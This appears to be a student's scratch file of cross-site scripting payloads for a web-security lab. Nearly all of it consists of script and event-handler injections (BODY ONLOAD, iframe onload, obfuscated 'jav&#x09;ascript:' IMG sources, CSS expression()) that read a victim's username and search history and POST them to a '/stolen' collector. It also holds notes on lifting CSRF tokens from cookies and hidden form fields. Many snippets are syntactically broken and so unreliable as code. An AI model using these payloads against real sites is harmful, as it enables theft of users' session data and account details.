
xss_payload.html


<script>var id = document.getElementById('logged-in-user').innerHTML;</script>
<script>console.log(document.getElementById('logged-in-user').innerHTML)</script>

<script>window.onload = function () { console.log(document.getElementById('logged-in-user').innerHTML,document.getElementsByClassName('history-item list-group-item').item(1))}</script>




divChild = document.getElementById("history-list").children[0];

history-item list-group-item

<script>var list= document.getElementsByClassName("history-list");
for (var i = 0; i < list.length; i++) {
    console.log(list[i].id);
}</script>


// $.post(‘http://127.0.0.1:31337/stolen?user=<username>&last_search=<last search>’,
<script>

var url = "127.0.0.1:31337/stolen";
var params = "user="+document.getElementById('logged-in-user').innerHTML+"&last_search"+window.onload = function () {document.getElementsByClassName('history-item list-group-item').item(1))};

console.log(total);
</script>
var xhr = new XMLHttpRequest();
xhr.open("POST", yourUrl, true);
xhr.setRequestHeader('Content-Type', '');xhr.send(JSON.stringify({value: value}));
//
// http.open("GET", url+"?"+params, true);
// http.onreadystatechange = function() {//Call a function when the state changes.
// 	if(http.readyState == 4 && http.status == 200) {
// 		alert(http.responseText);
// 	}
// }
//token
// network tab -> load this page -> headers -> sending cookie with csrf token send -> use document.cookie
//
// or
//
// look inside the form -> hidden csrf token with value -> POST request under network , see the form data from the hidden field.

//ajax to get request
window.location.href=send;

console.log(decodeURIComponent(document.cookie))
<script>document.cookie = 'xssdefense=0; csrfdefense=1; csrf_token=29e18efaa37226e88e3a1bef69227a6c; authuser="!yosB8SHk7hK7KR2EKsVS+A==?gAJVCGF1dGh1c2VycQFVCGF0dGFja2VycQKGcQMu"; _gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1; _gauges_unique_hour=1; _gauges_unique_day=1; expires=Thu, 18 Dec 2020 12:00:00 UTC'</script>
document.cookie = "username=John Doe; expires=Thu, 18 Dec 2013 12:00:00 UTC";
<script>document.cookie='csrf_token=9f06e550e78ee7e297073fc935e72b1a'</script>
9f06e550e78ee7e297073fc935e72b1a
Number 1:
<script>var xhr = new XMLHttpRequest()</script><script>window.onload = function () {var send=`http://127.0.0.1:31337/stolen`+`user=`+String(document.getElementById(`logged-in-user`).innerHTML)+`&last_search=`+document.getElementsByClassName(`history-item list-group-item`).item(1)}</script><script>xhr.open(`POST`, send, true)</script><script>xhr.send()</script>
<script>window.onload = function (){$.post (`http://127.0.0.1:31337/stolen`, {user: document.getElementById(`logged-in-user`).innerHTML lastsearch: document.getElementsByClassName(`history-item list-group-item`).item(1)})}</script>
Number 2:
<BODY ONLOAD="var xhr = new XMLHttpRequest();var url='http://127.0.0.1:31337/stolen';var params='user='+String(document.getElementById('logged-in-user').innerHTML)+'&last_search='+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open('POST', send, true);console.log(send);xhr.send()">
Number 3:
<iframe onload="myFunction()" src="/default.asp"></iframe>
<iframe onload="var xhr = new XMLHttpRequest();var url='http://127.0.0.1:31337/stolen';var params='user='+String(document.getElementById('logged-in-user').innerHTML)+'&last_search='+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open('POST', send, true);console.log(send);xhr.send()"></iframe>
<a href="#" onclick="someFunction();" return false;"

<script> var goods=document.cookie.split(';')[2].substr(document.cookie.split(';')[2].indexOf('='),document.cookie.split(';')[2].length); console.log(goods)</script>

<area ONLOAD ="var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()});">

<!---->window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()}<!---->

<IMG SRC="(javascript:window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send())}">

<BODY ONLOAD="console.log(document.getElementById('logged-in-user').innerHTML)">


<BODY ONLOAD="var xhr = new XMLHttpRequest();var url='http://127.0.0.1:31337/stolen';var params='user='+String(document.getElementById('logged-in-user').innerHTML)+'&last_search='+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open('POST', send, true);console.log(send);xhr.send()">


<DIV STYLE="width: expression(var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send())">


<IMG SRC="jav&#x09;ascript:window.onload = function () {var xhr = new XMLHttpRequest();var url="http://127.0.0.1:31337/stolen";var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);var send=(url+params);xhr.open("POST", send, true);console.log(send);xhr.send()};">
